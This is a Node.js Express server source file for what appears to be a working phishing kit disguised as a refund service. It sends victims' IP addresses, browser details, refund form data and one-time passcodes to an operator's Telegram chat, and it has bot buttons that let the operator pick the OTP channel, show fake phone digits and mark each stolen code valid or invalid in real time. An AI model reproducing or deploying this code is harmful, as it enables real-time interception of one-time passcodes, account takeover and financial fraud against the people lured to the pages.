// server.js (Node.js + Express)

console.log('⏳ loaded BOT_TOKEN:', JSON.stringify(process.env.BOT_TOKEN));

const express       = require('express');
const session       = require('express-session');
const bodyParser    = require('body-parser');
const path          = require('path');
const TelegramBot   = require('node-telegram-bot-api');
const cors          = require('cors');

// --- Config ---
const BOT_TOKEN     = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const PORT          = process.env.PORT || 3000;

// In‑memory store
const store = new Map();

// Express setup
const app = express();

// Disable ETag altogether
app.disable('etag');

// Apply no‑cache headers on every response
app.use((req, res, next) => {
  res.set({
    'Cache-Control': 'no-store, no-cache, must-revalidate, private',
    Pragma:          'no-cache',
    Expires:         '0'
  });
  next();
});

app.use(cors({ origin: '*' }));
app.use(bodyParser.json());
app.use(session({
  secret: 'your-session-secret',
  resave: false,
  saveUninitialized: true
}));

// Health check
app.get('/ping', (req, res) => res.send('pong'));

// Serve static files
app.get('/', (req, res) =>
  res.sendFile(path.join(__dirname, 'index.html'))
);
app.use(express.static(path.join(__dirname)));


// --- Telegram bot ---
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function findSessionByChatId(chatId) {
  for (let [sid, sess] of store) {
    if (sess.chatId === chatId) return sid;
  }
  return null;
}


// --- API routes ---

// Bind‑refund (refund.html)
app.post('/bind-refund', (req, res) => {
  const { chatId, ua, tz } = req.body;
  const sess = store.get(req.session.id) || {};
  Object.assign(sess, { chatId, ip: req.ip, userAgent: ua, timezone: tz });
  store.set(req.session.id, sess);

  bot.sendMessage(chatId,
    `🆕 Refund session started\n` +
    `<b>IP:</b> ${sess.ip}\n` +
    `<b>UA:</b> ${ua}\n` +
    `<b>TZ:</b> ${tz}`,
    { parse_mode: 'HTML' }
  );
  res.sendStatus(200);
});

// Bind‑chat (loading.html)
app.post('/bind-chat', (req, res) => {
  const { chatId, ua, tz } = req.body;
  const sess = {
    chatId,
    ready:      false,
    method:     null,
    phoneLast4: null,
    ip:         req.ip,
    userAgent:  ua,
    timezone:   tz
  };
  store.set(req.session.id, sess);

  bot.sendMessage(chatId,
    `🆕 New session bound\n` +
    `<b>IP:</b> ${sess.ip}\n` +
    `<b>UA:</b> ${ua}\n` +
    `<b>TZ:</b> ${tz}`,
    {
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [[
          { text: 'OTP via Phone', callback_data: 'startOtp:phone' },
          { text: 'OTP via Email', callback_data: 'startOtp:email' }
        ]]
      }
    }
  );
  res.sendStatus(200);
});

// Poll for OTP readiness (no-cache enforced above)
app.get('/otp-status', (req, res) => {
  const sess = store.get(req.session.id) || {};
  console.log('[/otp-status]', req.session.id, sess);
  res.json({
    ready:      sess.ready      || false,
    method:     sess.method     || null,
    phoneLast4: sess.phoneLast4 || null
  });
});

// Receive OTP submission
app.post('/submit-otp', (req, res) => {
  const { otp, ua, tz } = req.body;
  const sess = store.get(req.session.id) || {};
  Object.assign(sess, { submittedOtp: otp, subUA: ua, subTZ: tz });
  delete sess.valid;
  store.set(req.session.id, sess);

  if (sess.chatId) {
    bot.sendMessage(sess.chatId,
      `🔐 OTP Submission\n` +
      `<b>Session:</b> ${req.session.id}\n` +
      `<b>OTP:</b> <code>${otp}</code>\n` +
      `<b>UA:</b> ${ua}\n` +
      `<b>TZ:</b> ${tz}`,
      {
        parse_mode:  'HTML',
        reply_markup: {
          inline_keyboard: [
            [
              { text: '✅ Valid OTP',   callback_data: 'verifyOtp:ok'   },
              { text: '❌ Invalid OTP', callback_data: 'verifyOtp:fail' }
            ]
          ]
        }
      }
    );
  }
  res.sendStatus(200);
});

// Poll for OTP verification
app.get('/otp-verify-status', (req, res) => {
  const sess = store.get(req.session.id) || {};
  res.json({ valid: typeof sess.valid === 'boolean' ? sess.valid : null });
});

// Receive refund
app.post('/refund', (req, res) => {
  const data = req.body;
  const sess = store.get(req.session.id) || {};
  if (sess.chatId) {
    let msg = `📝 Refund Request\n<b>Session:</b> ${req.session.id}\n`;
    for (let [k, v] of Object.entries(data)) {
      msg += `<b>${k}:</b> ${v}\n`;
    }
    msg += `<b>IP:</b> ${sess.ip}\n`;
    bot.sendMessage(sess.chatId, msg, { parse_mode: 'HTML' });
  }
  res.sendStatus(200);
});


// --- Telegram button callbacks ---
bot.on('callback_query', async query => {
  const [action, param] = query.data.split(':');
  const chatId    = query.message.chat.id;
  const sessionId = findSessionByChatId(chatId);
  if (!sessionId) {
    return bot.answerCallbackQuery(query.id, { text: 'No active session' });
  }
  const sess = store.get(sessionId);

  if (action === 'startOtp') {
    sess.method      = param;
    sess.phoneLast4  = null;
    // email path → immediately ready
    if (param === 'email') {
      sess.ready = true;
      await bot.answerCallbackQuery(query.id, { text: 'OTP via email' });
      await bot.sendMessage(chatId, '🔔 OTP form enabled via email.');
    } else {
      // phone path → ask admin for last4 first
      await bot.answerCallbackQuery(query.id, { text: 'OTP via phone' });
      await bot.sendMessage(chatId,
        '❓ Please reply with the *last 4 digits* of the phone where the OTP will arrive:',
        { parse_mode: 'Markdown' }
      );
    }
    store.set(sessionId, sess);

  } else if (action === 'verifyOtp') {
    sess.valid = (param === 'ok');
    store.set(sessionId, sess);
    await bot.answerCallbackQuery(query.id, {
      text: sess.valid ? 'Marked valid' : 'Marked invalid'
    });
    await bot.sendMessage(chatId,
      sess.valid ? '✅ OTP marked valid.' : '❌ OTP marked invalid.'
    );
  }
});

// Capture admin’s 4‑digit reply for phone
bot.on('message', async msg => {
  const chatId    = msg.chat.id;
  const sessionId = findSessionByChatId(chatId);
  if (!sessionId) return;

  const sess = store.get(sessionId);
  const text = msg.text.trim();

  if (sess.method === 'phone' && !sess.phoneLast4 && /^\d{4}$/.test(text)) {
    sess.phoneLast4 = text;
    sess.ready      = true;
    store.set(sessionId, sess);

    await bot.sendMessage(chatId,
      `📱 Phone ending in ****${text} recorded. OTP prompt now enabled.`
    );
  }
});


// Start
app.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});
